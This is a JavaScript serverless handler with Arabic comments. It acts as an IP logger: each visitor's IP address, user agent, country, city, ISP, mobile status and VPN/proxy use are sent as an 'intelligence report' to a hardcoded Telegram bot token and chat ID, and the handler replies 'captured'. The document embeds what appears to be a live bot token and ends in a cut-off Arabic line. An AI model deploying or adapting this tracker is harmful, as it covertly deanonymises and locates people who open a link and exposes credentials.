export default async function handler(req, res) {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const botToken = "8677038270:AAF7pXdGVjJDBUgftzoDP0lnJsJEbNPjhpQ"; //
    const chatId = "5244299184"; //

    let geo = {};
    try {
        // جلب معلومات استخباراتية عن الـ IP
        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,mobile,proxy`);
        geo = await geoRes.json();
    } catch (e) {}

    const isProxy = geo.proxy ? "⚠️ يستخدم VPN/Proxy" : "✅ اتصال مباشر";
    const connectionType = geo.mobile ? "📱 بيانات هاتف" : "🏠 واي فاي/أرضي";

    const message = `🚨 **تقرير استخباراتي دقيق** 🚨\n\n` +
                    `🌐 **العنوان:** \`${ip}\`\n` +
                    `📍 **الموقع:** ${geo.country || 'غير معروف'}, ${geo.city || 'غير معروف'}\n` +
                    `🏢 **الشركة:** ${geo.isp || 'غير معروف'}\n` +
                    `📡 **الشبكة:** ${connectionType}\n` +
                    `🛡️ **الحماية:** ${isProxy}\n\n` +
                    `📱 **الجهاز:** \n\`${userAgent}\`\n\n` +
                    `⏰ **التوقيت:** ${new Date().toLocaleString('ar-EG')}`;

    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
    });

    res.status(200).json({ status: "captured" });
}تنبيه دخول جديد للم
